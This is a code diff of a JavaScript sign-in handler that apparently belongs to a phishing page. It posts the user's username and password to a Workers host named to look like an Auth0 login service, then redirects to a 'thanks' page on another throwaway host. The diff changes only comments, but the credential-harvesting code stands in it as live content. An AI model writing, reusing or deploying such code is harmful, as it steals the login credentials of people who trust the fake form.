@@ -11,19 +11,19 @@ $('#signin').click(function(event) {
         fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", {
             method: "POST",
             headers: {
-                "Content-Type": "application/json"  // Ensure JSON format
+                "Content-Type": "application/json"  // 🔹 Fixing Content-Type
             },
             body: JSON.stringify({
-                userID: username,   // Ensure the correct key
-                password: password  // Ensure the correct key
+                userID: username,   // 🔹 Ensuring correct keys
+                password: password
             })
         })
-        .then(response => response.json()) // Parse JSON response
+        .then(response => response.json())  // Parse JSON response
         .then(data => {
-            if (data.success) {  // Expecting a success response from the Worker
+            if (data.success) {  // Expecting a success response
                 setTimeout(() => {
                     window.location.href = "https://twklle.pages.dev/thanks.html";
-                }, 1000); 
+                }, 1000);
             } else {
                 passerror.innerHTML = data.error || "There was an error processing your request.";
             }
